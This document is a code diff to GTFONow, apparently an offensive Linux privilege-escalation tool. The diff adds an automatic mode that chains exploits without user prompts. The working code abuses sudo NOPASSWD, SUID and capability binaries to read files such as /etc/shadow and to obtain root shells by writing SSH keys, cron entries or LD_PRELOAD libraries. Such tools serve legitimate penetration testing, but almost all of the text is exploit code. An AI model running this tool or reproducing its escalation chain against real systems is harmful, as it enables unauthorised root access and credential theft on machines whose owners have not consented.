@@ -3249,6 +3249,7 @@ GREEN = '\033[32m'
 LIGHTGREY = '\033[37m'
 RESET = '\033[0m'
 YELLOW = '\033[0;33m'
+BOLD = '\033[1m'
 
 
 class CustomLogger(logging.Logger):
@@ -3318,7 +3319,7 @@ def execute_command(command):
         return None, "OS error occurred: " + str(e)
 
 
-def arbitrary_file_read(binary, payload, user="root", command=None):
+def arbitrary_file_read(binary, payload, auto, user="root", command=None):
     """Exploit arbitrary file read vulnerability.
 
     Args:
@@ -3329,13 +3330,26 @@ def arbitrary_file_read(binary, payload, user="root", command=None):
 
     if is_service_running("ssh"):
         ssh_key_privesc(payload, user)
+    if auto:
+        return
     print("Enter the file that you wish to read. (eg: /etc/shadow)")
     file_to_read = input("> ")
     payload = payload.replace("file_to_read", file_to_read)
     os.system(payload)
 
 
-def arbitrary_file_write(binary, payload, risk, user="root", command=None):
+def get_arb_write_options(user):
+    options = []
+    if is_service_running("ssh"):
+        options.append(("ssh", "Obtain shell by writing SSH key"))
+    if user == "root" and is_service_running("cron"):
+        options.append(("cron", "Obtain shell by writing to Cron"))
+    options.append(("ld_preload", "Obtain shell by writing to LD_PRELOAD"))
+    options.append(("arbitrary", "Arbitrary file Write (no shell)"))
+    return options
+
+
+def arbitrary_file_write(binary, payload, risk, auto, user="root", command=None):
     """Exploit arbitrary file write.
 
     Args:
@@ -3344,17 +3358,14 @@ def arbitrary_file_write(binary, payload, risk, user="root", command=None):
         user (str): User to exploit.
     """
     log.info("Performing arbitrary file write with %s", binary)
-    options = []
-    if risk == 2:
-        if is_service_running("ssh"):
-            options.append(("ssh", "Obtain shell by writing SSH key"))
-        if user == "root" and is_service_running("cron"):
-            options.append(("cron", "Obtain shell by writing to Cron"))
-        options.append(("ld_preload", "Obtain shell by writing to LD_PRELOAD"))
-        options.append(("arbitrary", "Arbitrary file Write (no shell)"))
+    if risk == 1:
+        manual_arbitrary_file_write(payload)
+        return
+    if risk == 2 and not auto:
+        options = get_arb_write_options(user)
         print("\nSelect an exploit option:")
-        for idx, (option_code, description) in enumerate(options):
-            print(GREEN + "[" + str(idx) + "] " + RESET + description)
+        for index, (_, description) in enumerate(options):
+            print(GREEN + "[" + str(index) + "] " + RESET + description)
         choice = get_user_choice("> ")
         chosen_option = options[choice][0]
         if chosen_option == "ssh":
@@ -3365,8 +3376,15 @@ def arbitrary_file_write(binary, payload, risk, user="root", command=None):
             ld_preload_exploit(binary, payload, command)
         elif chosen_option == "arbitrary":
             manual_arbitrary_file_write(payload)
-    else:
-        manual_arbitrary_file_write(payload)
+    if risk == 2 and auto:
+        options = get_arb_write_options(user)
+        for option in options:
+            if option[0] == "ssh":
+                ssh_write_privesc(payload, user, command)
+            if option[0] == "ld_preload":
+                ld_preload_exploit(binary, payload, command)
+            if option[0] == "cron":
+                cron_priv_esc(payload, command)
 
 
 def manual_arbitrary_file_write(payload):
@@ -3380,7 +3398,18 @@ def manual_arbitrary_file_write(payload):
     os.system(payload)
 
 
-def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root", command=None):
+def spawn_shell(payload):
+    """Spawn shell, if exits with return code 0, we assume exploit worked and this is a user controlled exit."""
+    if sys.version_info[0] < 3:
+        res = subprocess.call(payload, shell=True)
+    else:
+        res = subprocess.run(payload, shell=True)
+    if res.returncode == 0:
+        print("Thanks for using GTFONow!")
+        sys.exit()
+
+
+def exploit(binary,  payload, exploit_type, risk, auto, binary_path=None, user="root", command=None):
     """Exploit a binary.
 
     Args:
@@ -3397,15 +3426,15 @@ def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root",
     else:
         payload = payload.replace("./"+binary, binary)
     if "file_to_read" in payload:
-        arbitrary_file_read(binary, payload, user, command)
+        arbitrary_file_read(binary, payload, auto, user, command)
     elif "file_to_write" in payload:
-        arbitrary_file_write(binary, payload, risk, user, command)
+        arbitrary_file_write(binary, payload, risk,  auto, user, command)
     else:
         if command:
             execute_privileged_command(payload, command)
         else:
             log.info("Spawning %s shell", user)
-            os.system(payload)
+            spawn_shell(payload)
 
 
 def execute_privileged_command(payload, command):
@@ -3515,6 +3544,7 @@ def check_sudo_nopasswd_binaries(sudo_l_output):
         for binary_path in binaries:
             binary = binary_path.split('/')[-1]
             if binary not in sudo_bins.keys():
+                log.info("Found NOPASSWD binary %s, but no known exploit.", binary)
                 continue
 
             payloads = sudo_bins.get(binary)
@@ -3645,7 +3675,7 @@ def cron_priv_esc(payload, command=None):
             if command:
                 execute_privileged_command(payload, command)
             else:
-                os.system("/bin/bash -p")
+                spawn_shell("/bin/bash -p")
             break
         time.sleep(1)
         count = count + 1
@@ -3700,7 +3730,7 @@ def ld_preload_exploit(binary, payload, command=None):
         if command:
             execute_privileged_command("/bin/bash -p", command)
         else:
-            os.system("/bin/bash -p")
+            spawn_shell("/bin/bash -p")
 
 
 def check_cap_bins():
@@ -3802,7 +3832,7 @@ def ssh_write_privesc(payload, user="root", command=None):
             if command:
                 execute_privileged_command(shell_payload, command)
             else:
-                os.system(shell_payload)
+                spawn_shell(shell_payload)
 
 
 def ssh_key_privesc(payload, user="root", command=None):
@@ -3835,7 +3865,7 @@ def ssh_key_privesc(payload, user="root", command=None):
             if command:
                 execute_privileged_command(shell_payload, command)
             else:
-                os.system(shell_payload)
+                spawn_shell(shell_payload)
 
 
 def payload_type(payload):
@@ -3992,6 +4022,8 @@ def parse_arguments():
         "--command", help="Rather than spawn an interactive shell, issue a single command. Mainly for debugging purposes only.")
     parser.add_argument('-v', '--verbose', action='store_true',
                         help='Enable verbose output.')
+    parser.add_argument("-a", "--auto", action="store_true",
+                        help="Auto exploit without prompting for user input.")
     return parser.parse_args()
 
 
@@ -4033,7 +4065,7 @@ def display_privilege_escalation_options(priv_escs):
         logging.warning("No privilege escalations found.")
         sys.exit(1)
 
-    log.warning("Found %d Exploitable Binaries", len(priv_escs))
+    print("\nExploits available:")
 
     for key, value in enumerate(priv_escs):
         print_formatted_priv_esc_option(key, value)
@@ -4041,13 +4073,12 @@ def display_privilege_escalation_options(priv_escs):
 
 def print_formatted_priv_esc_option(key, value):
     info = format_priv_esc_info(value)
-
     print(GREEN+"["+str(key)+"] " + RESET + value['Binary'] +
           GREEN + " " + value["Payload Type"] + RESET)
     print("  Path: " + value["Path"])
     print("  Info: " + info)
     if value.get("Payload Description"):
-        print("  Payload Description: " + value["Payload Description"])
+        print("  Description: " + value["Payload Description"])
 
 
 def order_priv_escs(priv_esc):
@@ -4103,13 +4134,13 @@ def format_priv_esc_info(priv_esc):
     return info
 
 
-def execute_payload(priv_esc, risk, command=None):
+def execute_payload(priv_esc, risk, auto, command=None):
     user = priv_esc.get("SudoUser") or priv_esc.get("Owner")
     if user:
-        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk,
+        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk, auto,
                 binary_path=priv_esc["Path"], user=user, command=command)
     else:
-        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk,
+        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk, auto,
                 binary_path=priv_esc["Path"], command=command)
 
 
@@ -4125,12 +4156,22 @@ def main():
 
     priv_escs = sudo_privescs + suid_privescs + cap_privescs
     priv_escs = sorted(priv_escs, key=order_priv_escs)
+    if args.auto and args.risk == 1:
+        priv_escs = [item for item in priv_escs if item["Payload Type"] in [
+            "Shell", "Arbitrary read"]]
 
+        for priv_esc in priv_escs:
+            execute_payload(priv_esc, args.risk, args.auto, args.command)
+    if args.auto and args.risk == 2:
+        priv_escs = [item for item in priv_escs if item["Payload Type"] in [
+            "Shell", "Arbitrary read", "Arbitrary write"]]
+        for priv_esc in priv_escs:
+            execute_payload(priv_esc, args.risk, args.auto, args.command)
     display_privilege_escalation_options(priv_escs)
 
     choice = get_user_choice("Choose method to GTFO: ")
     selected_priv_esc = priv_escs[choice]
-    execute_payload(selected_priv_esc, args.risk, args.command)
+    execute_payload(selected_priv_esc, args.risk, args.auto, args.command)
 
 
 if __name__ == "__main__":
